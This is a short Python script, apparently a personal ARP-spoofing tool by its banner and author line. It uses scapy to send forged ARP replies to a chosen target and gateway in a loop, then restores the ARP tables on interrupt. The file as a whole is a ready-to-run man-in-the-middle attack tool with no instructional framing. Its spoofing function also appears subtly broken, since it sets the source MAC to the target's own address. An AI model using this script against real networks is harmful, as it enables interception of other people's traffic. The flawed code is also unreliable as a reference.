import scapy.all as scapy
import time
import argparse


def banner():
    ban = '''

╔═══╗───────────╔═══╦═══╦═══╦═══╗─────────╔═╗
║╔═╗║───────────║╔═╗║╔═╗║╔═╗║╔═╗║─────────║╔╝
║╚═╝╠══╦╗╔╦══╦═╗║║─║║╚═╝║╚═╝║╚══╦══╦══╦══╦╝╚╗
║╔╗╔╣╔╗║╚╝║║═╣╔╗╣╚═╝║╔╗╔╣╔══╩══╗║╔╗║╔╗║╔╗╠╗╔╝
║║║╚╣╔╗╠╗╔╣║═╣║║║╔═╗║║║╚╣║──║╚═╝║╚╝║╚╝║╚╝║║║
╚╝╚═╩╝╚╝╚╝╚══╩╝╚╩╝─╚╩╝╚═╩╝──╚═══╣╔═╩══╩══╝╚╝
────────────────────────────────║║
────────────────────────────────╚╝

Author: Nitin Choudhury
Version: 0.1.0
    '''

    print(ban)


class ARPSpoof:

    def getMAC(self, IP):
        ip = scapy.ARP(pdst=IP)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        packet = broadcast/ip

        answered = scapy.srp(packet,
                             timeout=5,
                             verbose=False)[0]

        response_tbl = {}
        for a in answered:
            response_tbl[a[1].psrc]= a[1].src

        return response_tbl[IP]


    def spoofARP(self, target_ip, gateway):
        spoof_pkt = scapy.ARP(op=2,
                              psrc=target_ip,
                              pdst=gateway,
                              hwsrc=self.getMAC(target_ip))  # op=1 >> WHO HAS || op=2 >> IS AT

        scapy.send(spoof_pkt, verbose=False)

        return


    def resetARP(self, target_ip, gateway):
        reset_pkt = scapy.ARP(op=2,
                              psrc=gateway,
                              pdst=target_ip,
                              hwsrc=self.getMAC(gateway),
                              hwdst=self.getMAC(target_ip))

        scapy.send(reset_pkt, verbose=False, count=2)

        return



def run(target_ip, gateway):
    spoof_ARP = ARPSpoof()

    count = 0
    try:
        while True:

            spoof_ARP.spoofARP(target_ip=target_ip,
                               gateway=gateway)

            spoof_ARP.spoofARP(target_ip=gateway,
                               gateway=target_ip)

            print(f"PACKET SENT: {count}\r", end="")
            time.sleep(2)

            count += 2

    except KeyboardInterrupt:
        print("RESTORING ARP TABLE... PLEASE WAIT...")

        count = 0
        for i in range(4):
            spoof_ARP.resetARP(target_ip=target_ip,
                               gateway=gateway)

            spoof_ARP.resetARP(target_ip=gateway,
                               gateway=target_ip)

            print(f"RESTORE PACKET SENT: {count}")
            time.sleep(1)

            count += 2

    except KeyError:
        run(target_ip=target_ip, gateway=gateway)

    except:
        raise

if __name__ == '__main__':

    banner()

    parser = argparse.ArgumentParser()

    parser.add_argument(
        "-t", "--target",
        help="TARGET IP",
        required=True,
        type=str
    )

    parser.add_argument(
        "-g", "--gateway",
        help="GATEWAY IP",
        required=True,
        type=str
    )

    args = parser.parse_args()

    target_ip = args.target
    gateway = args.gateway

    run(target_ip=target_ip,
        gateway=gateway)